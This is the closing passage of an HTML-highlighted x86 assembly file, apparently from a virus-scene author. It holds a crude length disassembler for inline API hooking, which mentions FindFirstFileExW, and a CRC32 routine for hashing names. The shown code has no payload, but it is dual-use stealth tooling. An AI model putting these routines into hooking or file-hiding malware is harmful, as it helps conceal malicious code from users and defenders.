</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">written</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc5">lifewire</span><span class="sc4">/</span><span class="sc5">ikx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">with</span><span class="sc0"> </span><span class="sc5">love</span><span class="sc0"> </span><span class="sc5">from</span><span class="sc0"> </span><span class="sc5">holland</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">




</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;poor disassembler. whatever, it aint a real disassembler anyway :)</span><span class="sc0">
</span><span class="sc1">;used for api hooking to retrieve the first n bytes (n should be &gt;= 5)</span><span class="sc0">
</span><span class="sc1">;int __fastcall poordasm(void* code)</span><span class="sc0">
</span><span class="sc5">@poordasm</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8bh</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__1</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0ech</span><span class="sc0"> 
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">pd_2</span><span class="sc0">    </span><span class="sc1">;mov ebp,esp</span><span class="sc0">
            </span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__2</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">75h</span><span class="sc0">  </span><span class="sc1">;push dwo[ebp+imm8]</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">pd_3</span><span class="sc0">

           </span><span class="sc5">__2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;               ;not smart to copy relative calls :)</span><span class="sc0">
</span><span class="sc1">;                cmp     al,0e8h</span><span class="sc0">
</span><span class="sc1">;                je      pd_5    ;call</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">33h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__3</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">pd_2</span><span class="sc0">    </span><span class="sc1">;xor reg,mem / xor reg,reg</span><span class="sc0">

           </span><span class="sc5">__3</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">83h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__4</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0ech</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">pd_3</span><span class="sc0">

          </span><span class="sc5">__4</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2bh</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__5</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">pd_2</span><span class="sc0">    </span><span class="sc1">;sub reg,reg</span><span class="sc0">

          </span><span class="sc5">__5</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">06ah</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">pd_2</span><span class="sc0">    </span><span class="sc1">;push imm8</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">pd_5</span><span class="sc0">    </span><span class="sc1">;push imm32</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">81h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__6</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0ech</span><span class="sc0"> </span><span class="sc1">;sub esp,imm32 - used in findfirstfileexw</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">pd_6</span><span class="sc0">

          </span><span class="sc5">__6</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11110000b</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">pd_1</span><span class="sc0">    </span><span class="sc1">;push or pop reg</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">pd_0</span><span class="sc0">

        </span><span class="sc5">pd_6</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc5">pd_5</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc5">pd_3</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc5">pd_2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc5">pd_1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc5">pd_0</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">




</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;int __fastcall crc32(char*);</span><span class="sc0">
</span><span class="sc5">@crc32</span><span class="sc0">          </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">mCRC32_init</span><span class="sc0">
        </span><span class="sc5">gCRC32_next_byte</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">;end of name ?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">gCRC32_finish</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
        </span><span class="sc5">gCRC32_next_bit</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">gCRC32_no_change</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">mCRC32</span><span class="sc0">
        </span><span class="sc5">gCRC32_no_change</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">gCRC32_next_bit</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">gCRC32_next_byte</span><span class="sc0">
        </span><span class="sc5">gCRC32_finish</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">;CRC32 to EAX</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@crc32</span><span class="sc0">          </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">


</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">main</span><span class="sc0">
</span></div></body>
</html>
